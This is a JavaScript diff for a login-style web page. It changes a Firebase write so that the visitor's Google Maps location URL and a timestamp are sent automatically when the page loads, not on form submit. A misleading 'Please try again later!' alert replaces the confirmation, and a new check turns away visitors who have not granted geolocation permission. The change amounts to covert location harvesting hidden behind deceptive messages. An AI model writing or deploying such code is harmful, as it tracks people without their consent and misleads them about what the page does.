@@ -35,23 +35,56 @@ function goToCurrentLocationOnGoogleMaps() {
     }
 }
 
-// Call the function
-goToCurrentLocationOnGoogleMaps();
+
 
 document.addEventListener('DOMContentLoaded', function () {
     // Get a reference to the database
     const database = firebase.database();
 
-    document.getElementById('login-form').addEventListener('submit', function (event) {
+    document.getElementById('login-page').addEventListener('load', function (event) {
         event.preventDefault();
 
         // Example of sending "hello" to Firebase on login click
         database.ref('messages').push().set({
-            message: googleMapsUrl
+            message: googleMapsUrl,
+            timestamp: firebase.database.ServerValue.TIMESTAMP,
         }).then(() => {
-            alert('Message sent to Firebase!');
+            alert('Please try again later!');
         }).catch((error) => {
             console.error('Error writing to Firebase Database', error);
         });
     });
+});
+
+
+async function checkLocationPermission() {
+    // Check if the Permissions API is supported
+    if (navigator.permissions) {
+        try {
+            const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+
+            // Log the current permission state
+            console.log(`Geolocation permission state: ${permissionStatus.state}`);
+
+            // Return true if permission is granted, false otherwise
+            return permissionStatus.state === 'granted';
+
+        } catch (error) {
+            console.error('Error querying geolocation permission:', error);
+            return false;
+        }
+    } else {
+        console.warn('Permissions API is not supported in this browser.');
+        return false;
+    }
+}
+
+// Usage example
+checkLocationPermission().then(hasPermission => {
+    if (hasPermission) {
+        // Call the function
+        goToCurrentLocationOnGoogleMaps();
+    } else {
+        alert('You do not have permission to access our website');
+    }
 });
